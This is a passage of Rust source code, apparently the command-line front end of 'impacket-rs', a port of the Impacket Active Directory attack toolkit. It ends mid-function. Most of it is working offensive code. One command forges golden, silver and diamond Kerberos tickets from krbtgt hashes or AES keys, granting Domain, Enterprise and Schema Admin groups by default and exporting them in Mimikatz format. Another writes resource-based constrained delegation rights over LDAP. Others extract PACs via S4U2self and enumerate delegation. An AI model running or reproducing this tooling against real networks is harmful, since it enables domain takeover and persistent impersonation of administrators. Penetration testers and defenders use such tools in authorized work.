        eprintln!("  Options:");
        eprintln!("    -nthash <NT_HASH>      krbtgt or service NT hash (hex)");
        eprintln!("    -aesKey <KEY>          krbtgt or service AES key (hex, 128 or 256 bits)");
        eprintln!("    -domain-sid <SID>      Domain SID (e.g. S-1-5-21-...)");
        eprintln!("    -domain <DOMAIN>       Domain FQDN (e.g. corp.contoso.com)");
        eprintln!("    -user <USER>           Target user to forge (default: Administrator)");
        eprintln!("    -rid <RID>             User RID (default: 500)");
        eprintln!("    -groups <G1,G2,...>    Comma-separated group RIDs (default: 512,513,519,520,518)");
        eprintln!("    -spn <SPN>             Service Principal Name (default: krbtgt/DOMAIN)");
        eprintln!("    -duration <HOURS>      Ticket lifetime in hours (default: 10)");
        eprintln!("    -diamond <TICKET>      Diamond ticket: elevate genuine TGT (.ccache / .kirbi)");
        eprintln!("    -kirbi                 Export as Windows Mimikatz .kirbi format instead of .ccache");
        std::process::exit(1);
    }

    let mut domain: Option<String> = None;
    let mut domain_sid: Option<RpcSid> = None;
    let mut username = "Administrator".to_string();
    let mut user_rid = 500u32;
    let mut group_rids = vec![512u32, 513, 519, 520, 518];
    let mut spn: Option<String> = None;
    let mut key_bytes: Option<Vec<u8>> = None;
    let mut etype = 23i32;
    let mut duration_hours = 10u32;
    let mut as_kirbi = false;
    let mut diamond_file: Option<String> = None;
    let mut output_file: Option<String> = None;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "-domain" if i + 1 < args.len() => {
                domain = Some(args[i + 1].clone());
                i += 2;
            }
            "-domain-sid" if i + 1 < args.len() => {
                match RpcSid::parse(&args[i + 1]) {
                    Ok(s) => domain_sid = Some(s),
                    Err(e) => {
                        eprintln!("[-] Invalid domain SID '{}': {}", args[i + 1], e);
                        std::process::exit(1);
                    }
                }
                i += 2;
            }
            "-user" if i + 1 < args.len() => {
                username = args[i + 1].clone();
                i += 2;
            }
            "-rid" if i + 1 < args.len() => {
                if let Ok(r) = args[i + 1].parse() {
                    user_rid = r;
                }
                i += 2;
            }
            "-groups" if i + 1 < args.len() => {
                group_rids = args[i + 1]
                    .split(',')
                    .filter_map(|s| s.trim().parse().ok())
                    .collect();
                i += 2;
            }
            "-spn" if i + 1 < args.len() => {
                spn = Some(args[i + 1].clone());
                i += 2;
            }
            "-diamond" if i + 1 < args.len() => {
                diamond_file = Some(args[i + 1].clone());
                i += 2;
            }
            "-nthash" if i + 1 < args.len() => {
                match decode_hex(&args[i + 1]) {
                    Ok(k) if k.len() == 16 => {
                        key_bytes = Some(k);
                        etype = 23;
                    }
                    _ => {
                        eprintln!("[-] Invalid NT hash: must be 32 hex characters (16 bytes)");
                        std::process::exit(1);
                    }
                }
                i += 2;
            }
            "-aesKey" if i + 1 < args.len() => {
                match decode_hex(&args[i + 1]) {
                    Ok(k) if k.len() == 16 => {
                        key_bytes = Some(k);
                        etype = 17;
                    }
                    Ok(k) if k.len() == 32 => {
                        key_bytes = Some(k);
                        etype = 18;
                    }
                    _ => {
                        eprintln!("[-] Invalid AES key: must be 32 hex characters (AES-128) or 64 hex characters (AES-256)");
                        std::process::exit(1);
                    }
                }
                i += 2;
            }
            "-duration" if i + 1 < args.len() => {
                if let Ok(d) = args[i + 1].parse() {
                    duration_hours = d;
                }
                i += 2;
            }
            "-kirbi" => {
                as_kirbi = true;
                i += 1;
            }
            s if !s.starts_with('-') => {
                output_file = Some(s.to_string());
                i += 1;
            }
            _ => i += 1,
        }
    }

    let domain = match domain {
        Some(d) => d,
        None => {
            eprintln!("[-] Missing mandatory parameter: -domain <DOMAIN>");
            std::process::exit(1);
        }
    };
    let domain_sid = match domain_sid {
        Some(s) => s,
        None => {
            eprintln!("[-] Missing mandatory parameter: -domain-sid <SID>");
            std::process::exit(1);
        }
    };
    let key = match key_bytes {
        Some(k) => k,
        None => {
            eprintln!("[-] Missing encryption key: provide -nthash <HEX> or -aesKey <HEX>");
            std::process::exit(1);
        }
    };
    let out_path = match output_file {
        Some(p) => p,
        None => {
            if as_kirbi {
                format!("{}.kirbi", username)
            } else {
                format!("{}.ccache", username)
            }
        }
    };

    let spn_parts: Vec<String> = match spn {
        Some(ref s) => s.split('/').map(|p| p.to_string()).collect(),
        None => vec!["krbtgt".to_string(), domain.clone()],
    };

    println!("[*] Forging Kerberos ticket...");
    println!("  Target Realm   : {}", domain.to_uppercase());
    println!("  User           : {} (RID: {})", username, user_rid);
    println!("  Groups         : {:?}", group_rids);
    println!("  SPN            : {}", spn_parts.join("/"));
    println!("  Key EType      : {}", etype);
    println!("  Lifetime       : {} hours", duration_hours);

    let ccache = if let Some(ref base_file) = diamond_file {
        println!("[*] Forging Diamond ticket from genuine base ticket: {}", base_file);
        let raw = match std::fs::read(base_file) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Error opening {}: {}", base_file, e);
                std::process::exit(1);
            }
        };

        use impacket_krb5::ccache::CCache;
        let mut base_ccache = if let Ok(c) = CCache::parse(&raw) {
            c
        } else if let Ok(c) = CCache::from_kirbi(&raw) {
            c
        } else {
            eprintln!("[-] Could not parse base ticket: file must be valid .ccache or .kirbi");
            std::process::exit(1);
        };

        if base_ccache.credentials.is_empty() {
            eprintln!("[-] Base ticket file contains no credentials");
            std::process::exit(1);
        }

        let base_ticket_der = &base_ccache.credentials[0].ticket;
        let diamond_ticket_bytes = match impacket_krb5::forge_diamond_ticket(
            base_ticket_der,
            &key,
            etype,
            Some(user_rid),
            &group_rids,
        ) {
            Ok(d) => d,
            Err(e) => {
                eprintln!("[-] Failed to forge Diamond ticket: {}", e);
                std::process::exit(1);
            }
        };

        base_ccache.credentials[0].ticket = diamond_ticket_bytes;
        println!("[+] Successfully forged Diamond ticket with elevated group memberships.");
        base_ccache
    } else {
        let opts = TicketOptions {
            domain: domain.clone(),
            username: username.clone(),
            domain_sid,
            user_rid,
            group_rids,
            spn: spn_parts,
            key,
            etype,
            duration_hours,
        };

        match forge_ticket(&opts) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed to forge ticket: {}", e);
                std::process::exit(1);
            }
        }
    };

    let write_res = if as_kirbi {
        match ccache.to_kirbi() {
            Ok(kirbi_bytes) => std::fs::write(&out_path, &kirbi_bytes),
            Err(e) => {
                eprintln!("[-] Failed to generate .kirbi: {}", e);
                std::process::exit(1);
            }
        }
    } else {
        std::fs::write(&out_path, &ccache.to_bytes())
    };

    match write_res {
        Ok(_) => {
            println!("[+] Successfully exported forged ticket to '{}'", out_path);
        }
        Err(e) => {
            eprintln!("[-] Failed to write '{}': {}", out_path, e);
            std::process::exit(1);
        }
    }
}

fn cmd_describe_ticket(args: &[String]) {
    use impacket_core::encode_hex;
    use impacket_krb5::ccache::CCache;

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs describeTicket <TICKET_FILE>");
        eprintln!("  Inspects Kerberos .ccache or .kirbi files, displaying tickets, flags, timestamps, and keys.");
        std::process::exit(1);
    }

    let file_path = &args[0];
    let raw_bytes = match std::fs::read(file_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] Cannot read '{}': {}", file_path, e);
            std::process::exit(1);
        }
    };

    let ccache = if raw_bytes.first() == Some(&0x76) {
        println!("[*] Format: Windows Mimikatz .kirbi (KRB-CRED)");
        match CCache::from_kirbi(&raw_bytes) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed to parse .kirbi file: {}", e);
                std::process::exit(1);
            }
        }
    } else {
        println!("[*] Format: MIT Kerberos .ccache v4");
        match CCache::parse(&raw_bytes) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed to parse .ccache file: {}", e);
                std::process::exit(1);
            }
        }
    };

    println!("  Primary Principal : {}", ccache.primary_principal.to_display_string());
    println!("  Credentials Count : {}", ccache.credentials.len());
    println!();

    for (idx, cred) in ccache.credentials.iter().enumerate() {
        println!("Credential [{}]:", idx + 1);
        println!("  Client Principal  : {}", cred.client.to_display_string());
        println!("  Server Principal  : {}", cred.server.to_display_string());
        println!("  Session Key Type  : {} (0x{:04X})", cred.key.keytype, cred.key.keytype);
        println!("  Session Key Value : {}", encode_hex(&cred.key.keyvalue));
        println!("  Auth Time (Unix)  : {}", cred.times.authtime);
        println!("  Start Time (Unix) : {}", cred.times.starttime);
        println!("  End Time (Unix)   : {}", cred.times.endtime);
        println!("  Renew Till (Unix) : {}", cred.times.renew_till);
        println!("  Ticket Flags      : 0x{:08X}", cred.ticket_flags);
        println!("  Ticket Length     : {} bytes", cred.ticket.len());
        println!();
    }
}

fn checksum_type_name(t: u32) -> &'static str {
    match t {
        CKSUMTYPE_HMAC_MD5 => "HMAC-MD5 (-138)",
        CKSUMTYPE_HMAC_SHA1_96_AES128 => "HMAC-SHA1-96-AES128 (15)",
        CKSUMTYPE_HMAC_SHA1_96_AES256 => "HMAC-SHA1-96-AES256 (16)",
        CKSUMTYPE_CRC32 => "CRC32 (1)",
        CKSUMTYPE_RSA_MD5 => "RSA-MD5 (7)",
        _ => "Unknown",
    }
}

fn print_filetime_pac(label: &str, ft: u64) {
    if let Some(unix) = PacLogonInfo::filetime_to_unix(ft) {
        let secs = unix.max(0) as u64;
        let d = std::time::UNIX_EPOCH + std::time::Duration::from_secs(secs);
        println!("{}: Unix timestamp {} ({:?})", label, unix, d);
    } else if ft == 0 {
        println!("{}: (never / not set)", label);
    } else {
        println!("{}: (never / raw: 0x{:016X})", label, ft);
    }
}

fn print_pac_report(pac: &Pac) {
    println!("[*] PAC Structure:");
    println!("  Buffers Count : {}", pac.buffers.len());
    println!();

    if let Ok(client) = pac.get_client_info() {
        println!("[*] PAC_CLIENT_INFO:");
        println!("  Client Name   : {}", client.name);
        println!("  Client ID (FT): {}", client.client_id);
        if let Some(unix) = PacLogonInfo::filetime_to_unix(client.client_id) {
            let secs = unix.max(0) as u64;
            let d = std::time::UNIX_EPOCH + std::time::Duration::from_secs(secs);
            println!("  Client Time   : Unix {} ({:?})", unix, d);
        }
        println!();
    }

    if let Ok(logon) = pac.get_logon_info() {
        println!("[*] PAC_LOGON_INFO (KERB_VALIDATION_INFO):");
        println!("  Account Name  : {}", logon.effective_name);
        if !logon.full_name.is_empty() {
            println!("  Full Name     : {}", logon.full_name);
        }
        println!("  User RID      : {}", logon.user_id);
        if let Some(user_sid) = logon.user_sid() {
            println!("  User SID      : {}", user_sid);
        }
        println!("  Primary Group : RID {}", logon.primary_group_id);
        println!("  Logon Domain  : {}", logon.logon_domain_name);
        if let Some(ref dom_sid) = logon.logon_domain_id {
            println!("  Domain SID    : {}", dom_sid);
        }
        if !logon.logon_server.is_empty() {
            println!("  Logon Server  : {}", logon.logon_server);
        }
        println!("  User Flags    : 0x{:08X}", logon.user_flags);
        println!("  UAC Flags     : 0x{:08X}", logon.user_account_control);

        print_filetime_pac("  Logon Time    ", logon.logon_time);
        print_filetime_pac("  Pwd Last Set  ", logon.password_last_set);
        print_filetime_pac("  Pwd Can Change", logon.password_can_change);
        print_filetime_pac("  Pwd Must Chng ", logon.password_must_change);
        println!();

        println!("  Group Memberships ({} groups):", logon.group_rids.len());
        for (rid, attrs) in &logon.group_rids {
            let label = match *rid {
                512 => " - Domain Admins [!] HIGH PRIVILEGE",
                513 => " - Domain Users",
                514 => " - Domain Guests",
                515 => " - Domain Computers",
                516 => " - Domain Controllers",
                517 => " - Cert Publishers",
                518 => " - Schema Admins [!] HIGH PRIVILEGE",
                519 => " - Enterprise Admins [!] HIGH PRIVILEGE",
                520 => " - Group Policy Creator Owners",
                521 => " - Read-only Domain Controllers",
                522 => " - Cloneable Domain Controllers",
                525 => " - Protected Users",
                526 => " - Key Admins [!] HIGH PRIVILEGE",
                527 => " - Enterprise Key Admins [!] HIGH PRIVILEGE",
                544 => " - Administrators [!] HIGH PRIVILEGE",
                548 => " - Account Operators",
                549 => " - Server Operators",
                550 => " - Print Operators",
                551 => " - Backup Operators",
                _ => "",
            };
            println!("    RID {:<5} (Attributes: 0x{:08X}){}", rid, attrs, label);
        }
        println!();
    }

    if let Ok(server_sig) = pac.get_signature(PAC_SERVER_CHECKSUM) {
        println!("[*] PAC_SERVER_CHECKSUM:");
        println!(
            "  Checksum Type : {} (0x{:08X})",
            checksum_type_name(server_sig.signature_type),
            server_sig.signature_type
        );
        println!("  Signature     : {}", encode_hex(&server_sig.signature));
        if let Some(rodc) = server_sig.rodc_identifier {
            println!("  RODC ID       : {}", rodc);
        }
        println!();
    }

    if let Ok(privsvr_sig) = pac.get_signature(PAC_PRIVSVR_CHECKSUM) {
        println!("[*] PAC_PRIVSVR_CHECKSUM (KDC Signature):");
        println!(
            "  Checksum Type : {} (0x{:08X})",
            checksum_type_name(privsvr_sig.signature_type),
            privsvr_sig.signature_type
        );
        println!("  Signature     : {}", encode_hex(&privsvr_sig.signature));
        if let Some(rodc) = privsvr_sig.rodc_identifier {
            println!("  RODC ID       : {}", rodc);
        }
        println!();
    }

    if let Ok(attrs) = pac.get_attributes_info() {
        println!("[*] PAC_ATTRIBUTES_INFO:");
        println!("  Flags Length  : {}", attrs.flags_length);
        println!("  Flags         : 0x{:08X}", attrs.flags);
        println!();
    }

    if let Ok(req_sid) = pac.get_requestor_info() {
        println!("[*] PAC_REQUESTOR_INFO:");
        println!("  Requestor SID : {}", req_sid);
        println!();
    }
}

fn cmd_get_user_pac(args: &[String]) {
    use impacket_core::decode_hex;
    use impacket_krb5::ccache::CCache;
    use std::path::Path;
    use std::time::SystemTime;

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs GetUserPAC <TARGET|TICKET_FILE> [options]");
        eprintln!("  Extracts and inspects the Kerberos Privilege Attribute Certificate (PAC)");
        eprintln!("  from a live Active Directory KDC via S4U2self or offline from a ticket file.");
        eprintln!();
        eprintln!("Target syntax:");
        eprintln!("  [[domain/]user[:password]@]<host>");
        eprintln!("  or path to a .ccache, .kirbi, or .pac file");
        eprintln!();
        eprintln!("Options:");
        eprintln!("  -target-user <USER>   User to query via S4U2self (defaults to authenticated user)");
        eprintln!("  -hashes LM:NT         NTLM hash authentication (:NT)");
        eprintln!("  -aesKey <HEX>         Kerberos AES256 or AES128 key");
        eprintln!("  -key <HEX>            Ticket decryption key (HEX string or NT hash)");
        eprintln!("  -spn <SPN>            SPN to request (defaults to user itself)");
        eprintln!("  -dc-ip <IP>           Override Domain Controller IP");
        eprintln!("  -port <PORT>          KDC port (default 88)");
        std::process::exit(1);
    }

    let first_arg = &args[0];

    // Check if first arg is an existing file or ticket extension
    if Path::new(first_arg).exists()
        || first_arg.ends_with(".ccache")
        || first_arg.ends_with(".kirbi")
        || first_arg.ends_with(".pac")
    {
        println!("[*] Loading offline ticket/PAC file '{}'...", first_arg);
        let raw_bytes = match std::fs::read(first_arg) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Cannot read '{}': {}", first_arg, e);
                std::process::exit(1);
            }
        };

        // 1. Direct PAC file
        if let Ok(pac) = Pac::parse(&raw_bytes) {
            println!("[+] Successfully parsed raw PAC blob.");
            print_pac_report(&pac);
            return;
        }

        // 2. Parse CCache or Kirbi
        let ccache = if raw_bytes.first() == Some(&0x76) {
            match CCache::from_kirbi(&raw_bytes) {
                Ok(c) => c,
                Err(e) => {
                    eprintln!("[-] Failed to parse .kirbi file: {}", e);
                    std::process::exit(1);
                }
            }
        } else {
            match CCache::parse(&raw_bytes) {
                Ok(c) => c,
                Err(e) => {
                    eprintln!("[-] Failed to parse .ccache file: {}", e);
                    std::process::exit(1);
                }
            }
        };

        if ccache.credentials.is_empty() {
            eprintln!("[-] No credentials found in ticket container.");
            std::process::exit(1);
        }

        let cred = &ccache.credentials[0];
        let (etype, _kvno, cipher) = match parse_ticket_enc_part(&cred.ticket) {
            Ok(p) => p,
            Err(e) => {
                eprintln!("[-] Failed to parse ticket ASN.1 structure: {}", e);
                std::process::exit(1);
            }
        };

        // Extract key from command line or credential session key
        let mut key_hex: Option<String> = None;
        let mut i = 1;
        while i < args.len() {
            if (args[i] == "-key" || args[i] == "-aesKey") && i + 1 < args.len() {
                key_hex = Some(args[i + 1].clone());
                i += 2;
            } else {
                i += 1;
            }
        }

        let key_bytes = if let Some(hex) = key_hex {
            match decode_hex(&hex) {
                Ok(b) => b,
                Err(e) => {
                    eprintln!("[-] Invalid hex key: {}", e);
                    std::process::exit(1);
                }
            }
        } else if !cred.key.keyvalue.is_empty() {
            cred.key.keyvalue.clone()
        } else {
            eprintln!("[-] Encrypted ticket requires decryption key. Specify -key <HEX> or -hashes :NT");
            std::process::exit(1);
        };

        match extract_pac_from_ticket(&cipher, etype, &key_bytes) {
            Ok(pac) => {
                println!("[+] Successfully decrypted ticket and extracted PAC.");
                print_pac_report(&pac);
            }
            Err(e) => {
                eprintln!("[-] Failed to decrypt ticket and extract PAC: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    // Live Active Directory query
    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut target_user: Option<String> = None;
    let mut custom_spn: Option<String> = None;
    let mut aes_key_hex: Option<String> = None;
    let mut dc_ip: Option<String> = None;
    let mut port: u16 = 88;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-target-user" if i + 1 < args.len() => {
                target_user = Some(args[i + 1].clone());
                i += 2;
            }
            "-spn" if i + 1 < args.len() => {
                custom_spn = Some(args[i + 1].clone());
                i += 2;
            }
            "-aesKey" if i + 1 < args.len() => {
                aes_key_hex = Some(args[i + 1].clone());
                i += 2;
            }
            "-dc-ip" if i + 1 < args.len() => {
                dc_ip = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                port = args[i + 1].parse().unwrap_or(88);
                i += 2;
            }
            _ => i += 1,
        }
    }

    let kdc_host = dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());

    let nt_hash: [u8; 16] = if let Some(h) = &spec.hashes {
        h.nt
    } else if let Some(p) = &spec.password {
        compute_ntlm_hashes(p.expose_secret()).nt
    } else {
        eprintln!("[-] GetUserPAC needs a password or -hashes :NT");
        std::process::exit(1);
    };

    println!("[*] Connecting to KDC at {}:{} for '{}'...", kdc_host, port, spec.username);
    let (tgt_ticket, enc_part_cipher) = match get_tgt_live(
        kdc_host,
        port,
        &spec.domain,
        &spec.username,
        &nt_hash,
        DEFAULT_TIMEOUT,
    ) {
        Ok(KdcAsResponse::AsRep {
            ticket,
            enc_part_cipher,
            ..
        }) => (ticket, enc_part_cipher),
        Ok(KdcAsResponse::Error { error_code, .. }) => {
            eprintln!(
                "[-] KDC returned error during TGT acquisition: 0x{:X} ({})",
                error_code.0,
                error_code.name()
            );
            std::process::exit(1);
        }
        Err(e) => {
            eprintln!("[-] Failed to acquire TGT: {}", e);
            std::process::exit(1);
        }
    };

    println!("[+] Acquired TGT successfully.");
    let (session_etype, session_key) = match extract_session_key_from_as_rep(&enc_part_cipher, &nt_hash) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("[-] Failed to decrypt TGS session key: {}", e);
            std::process::exit(1);
        }
    };

    let query_user = target_user.unwrap_or_else(|| spec.username.clone());
    let requested_spn = custom_spn.unwrap_or_else(|| spec.username.clone());

    let now_unix = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(1_700_000_000);

    let mut tgs_req = Krb5TgsReq::new(
        &spec.domain,
        &spec.username,
        &requested_spn,
        &tgt_ticket,
        &session_key,
        session_etype,
        &[KerberosEType::Rc4Hmac, KerberosEType::Aes256CtsHmacSha1_96],
    );

    if query_user != spec.username {
        println!("[*] Executing S4U2self for target user '{}'...", query_user);
        tgs_req.s4u2self_user = Some(query_user.clone());
    } else {
        println!("[*] Requesting Service Ticket for user '{}'...", query_user);
    }

    let tgs_rep = match get_tgs_live(kdc_host, port, &tgs_req, now_unix, DEFAULT_TIMEOUT) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[-] Failed TGS-REQ exchange: {}", e);
            std::process::exit(1);
        }
    };

    println!("[+] Service Ticket received (etype {}). Decrypting PAC...", tgs_rep.ticket_enc_etype);

    // Decrypt ticket with user key
    let pac = if tgs_rep.ticket_enc_etype == 23 {
        extract_pac_from_ticket(&tgs_rep.ticket_enc_cipher, 23, &nt_hash)
    } else if let Some(ref hex) = aes_key_hex {
        let key_bytes = match decode_hex(hex) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Invalid AES key hex: {}", e);
                std::process::exit(1);
            }
        };
        extract_pac_from_ticket(&tgs_rep.ticket_enc_cipher, tgs_rep.ticket_enc_etype, &key_bytes)
    } else if let Some(p) = &spec.password {
        let salt = format!("{}{}", spec.domain.to_uppercase(), spec.username);
        let aes256 = string_to_key_aes256(p.expose_secret(), &salt, 4096);
        extract_pac_from_ticket(&tgs_rep.ticket_enc_cipher, tgs_rep.ticket_enc_etype, &aes256)
    } else {
        eprintln!(
            "[-] Ticket encrypted with etype {}. Please provide -aesKey <HEX> or password.",
            tgs_rep.ticket_enc_etype
        );
        std::process::exit(1);
    };

    let pac = match pac {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[-] Failed to decrypt ticket and extract PAC: {}", e);
            std::process::exit(1);
        }
    };

    println!("[+] Successfully extracted and decrypted PAC for '{}'!\n", query_user);
    print_pac_report(&pac);
}

fn cmd_rbcd(args: &[String]) {
    use impacket_ldap::rbcd::{flush_rbcd, read_rbcd, write_rbcd};
    use impacket_ldap::LdapClient;
    use impacket_ndr::RpcSid;

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs rbcd <TARGET> -delegate-to <TARGET_DN> [-delegate-from <GRANTEE_SID>] [-action read|write|flush] [-hashes LM:NT]");
        eprintln!("  Examples:");
        eprintln!("    impacket-rs rbcd corp.contoso.com/user:pass@dc01 -action read -delegate-to \"CN=FS01,CN=Computers,DC=corp,DC=contoso,DC=com\"");
        eprintln!("    impacket-rs rbcd corp.contoso.com/user:pass@dc01 -action write -delegate-to \"CN=FS01,CN=Computers,DC=corp,DC=contoso,DC=com\" -delegate-from S-1-5-21-123-456-789-1105");
        eprintln!("    impacket-rs rbcd corp.contoso.com/user:pass@dc01 -action flush -delegate-to \"CN=FS01,CN=Computers,DC=corp,DC=contoso,DC=com\"");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut action = "read".to_string();
    let mut delegate_to: Option<String> = None;
    let mut delegate_from: Option<RpcSid> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-action" if i + 1 < args.len() => {
                action = args[i + 1].to_lowercase();
                i += 2;
            }
            "-delegate-to" if i + 1 < args.len() => {
                delegate_to = Some(args[i + 1].clone());
                i += 2;
            }
            "-delegate-from" if i + 1 < args.len() => {
                match RpcSid::parse(&args[i + 1]) {
                    Ok(s) => delegate_from = Some(s),
                    Err(e) => {
                        eprintln!("[-] Invalid grantee SID '{}': {}", args[i + 1], e);
                        std::process::exit(1);
                    }
                }
                i += 2;
            }
            _ => i += 1,
        }
    }

    let target_dn = match delegate_to {
        Some(dn) => dn,
        None => {
            eprintln!("[-] Missing mandatory parameter: -delegate-to <TARGET_DN>");
            std::process::exit(1);
        }
    };

    let host = spec.effective_target_ip();
    let addr = format!("{}:389", host);
    println!("[*] Connecting to LDAP on {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] LDAP connection failed: {}", e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Authenticating as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful.");
    }

    match action.as_str() {
        "read" => {
            println!("[*] Reading msDS-AllowedToActOnBehalfOfOtherIdentity on '{}'...", target_dn);
            match read_rbcd(&mut client, &target_dn) {
                Ok(sids) => {
                    if sids.is_empty() {
                        println!("[*] No RBCD trustees configured on target.");
                    } else {
                        println!("[+] Allowed RBCD Trustee SIDs ({}):", sids.len());
                        for s in sids {
                            println!("    -> {}", s.to_string());
                        }
                    }
                }
                Err(e) => eprintln!("[-] RBCD read failed: {}", e),
            }
        }
        "write" => {
            let grantee = match delegate_from {
                Some(s) => s,
                None => {
                    eprintln!("[-] -action write requires -delegate-from <GRANTEE_SID>");
                    std::process::exit(1);
                }
            };
            println!("[*] Configuring RBCD: granting '{}' rights to act on behalf of other identity to '{}'...", grantee.to_string(), target_dn);
            match write_rbcd(&mut client, &target_dn, &grantee) {
                Ok(()) => println!("[+] RBCD configuration successfully written!"),
                Err(e) => eprintln!("[-] RBCD write failed: {}", e),
            }
        }
        "flush" => {
            println!("[*] Flushing msDS-AllowedToActOnBehalfOfOtherIdentity on '{}'...", target_dn);
            match flush_rbcd(&mut client, &target_dn) {
                Ok(()) => println!("[+] RBCD attribute successfully flushed/cleared!"),
                Err(e) => eprintln!("[-] RBCD flush failed: {}", e),
            }
        }
        other => eprintln!("[-] Unknown action '{}': choose read, write, or flush", other),
    }

    client.unbind().ok();
}

fn cmd_find_delegation(args: &[String]) {
    use impacket_ldap::delegation::{find_delegation, DelegationType};
    use impacket_ldap::LdapClient;

    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs findDelegation <TARGET> [-base <BASE_DN>] [-graph] [-json] [-hashes LM:NT]");
        println!("  Discovers Active Directory accounts configured for Kerberos Delegation");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut base_dn = String::new();
    let mut show_graph = false;
    let mut show_json = false;
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-base" if i + 1 < args.len() => {
                base_dn = args[i + 1].clone();
                i += 2;
            }
            "-graph" => {
                show_graph = true;
                i += 1;
            }
            "-json" => {
                show_json = true;
                i += 1;
            }
            _ => i += 1,
        }
    }

    if base_dn.is_empty() && !spec.domain.is_empty() {
        base_dn = spec.domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",");
    }

    let host = spec.effective_target_ip();
    let addr = format!("{}:389", host);
    println!("[*] Connecting to LDAP on {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] LDAP connection failed: {}", e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Authenticating as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful.");
    }

    println!("[*] Scanning delegation configurations under '{}'...", base_dn);
    let records = match find_delegation(&mut client, &base_dn) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[-] Delegation search failed: {}", e);
            std::process::exit(1);
        }
    };

    println!();
    println!("=== 1. UNCONSTRAINED DELEGATION ===");
    for r in &records {
        if let DelegationType::Unconstrained { is_dc } = &r.delegation {
            let role = if *is_dc { "Domain Controller" } else { "Server / User" };
            println!("  Account : {} ({})", r.sam_account_name, role);
            println!("  DN      : {}", r.dn);
            println!("  UAC     : 0x{:08X}", r.user_account_control);
            println!();
        }
    }

    println!("=== 2. CONSTRAINED DELEGATION ===");
    for r in &records {
        if let DelegationType::Constrained { protocol_transition, allowed_targets } = &r.delegation {
            println!("  Account             : {}", r.sam_account_name);
            println!("  DN                  : {}", r.dn);
            println!("  Protocol Transition : {}", if *protocol_transition { "ENABLED (S4U2Self)" } else { "Disabled" });
            println!("  Allowed Targets ({}):", allowed_targets.len());
            for t in allowed_targets {
                println!("    -> {}", t);
            }
            println!();
        }
    }

    println!("=== 3. RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) ===");
    for r in &records {
        if let DelegationType::ResourceBased { allowed_sids } = &r.delegation {
            println!("  Target Resource  : {}", r.sam_account_name);
            println!("  DN               : {}", r.dn);
            println!("  Allowed SIDs ({}):", allowed_sids.len());
            for s in allowed_sids {
                println!("    -> {}", s.to_string());
            }
            println!();
        }
    }

    if show_graph {
        println!("=== ACTIVE DIRECTORY DELEGATION GRAPH ===");
        for r in &records {
            match &r.delegation {
                DelegationType::Unconstrained { is_dc } => {
                    let mark = if *is_dc { "[DC]" } else { "[Account]" };
                    println!("  {} {} ===(Unconstrained)===> [* ANY SERVICE *]", mark, r.sam_account_name);
                }
                DelegationType::Constrained { protocol_transition, allowed_targets } => {
                    let trans = if *protocol_transition { "Constrained + S4U2Self" } else { "Constrained" };
                    for t in allowed_targets {
                        println!("  [Account] {} ===({})===> [{}]", r.sam_account_name, trans, t);
                    }
                }
